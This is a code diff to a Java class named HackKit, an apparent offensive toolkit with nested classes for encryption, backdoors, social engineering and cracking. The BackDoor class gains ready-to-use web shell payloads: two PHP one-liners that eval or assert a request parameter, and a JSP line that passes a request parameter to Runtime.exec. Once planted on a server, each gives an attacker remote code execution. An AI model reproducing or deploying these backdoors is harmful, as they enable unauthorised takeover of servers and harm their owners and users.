@@ -25,8 +25,6 @@ import java.util.List;
 @Scope("prototype")
 public  class HackKit {
 
-    public  Session requests = Requests.session();
-
     public EnDecrypt enDecrypt = new EnDecrypt();
 
     public BackDoor backDoor = new BackDoor();
@@ -35,6 +33,10 @@ public  class HackKit {
 
     public Intruder intruder = new Intruder();
 
+
+    /**
+     * 加密解密类
+     */
     public class EnDecrypt{
 
         public Sha1 sha1 = new Sha1();
@@ -265,15 +267,28 @@ public  class HackKit {
 
     }
 
-    public  class  BackDoor{
 
-        public String php一句话 = "<?php eval($_REQUEST['x']);?>";
+    /**
+     * 后门类
+     */
+    public class  BackDoor{
+
+        public String php ="<?php eval($_REQUEST['x']);?>";
+        public String php2 = "<?php assert($_REQUEST['x']);?>";
+        public String jsp1 = "<%Runtime.getRuntime().exec(request.getParameter(\"x\"));%>";
 
     }
 
+
+    /**
+     * 社工类
+     */
     public class  SocialEngine{
     }
 
+    /**
+     * 破解器
+     */
     public  class Intruder{
 
         /**
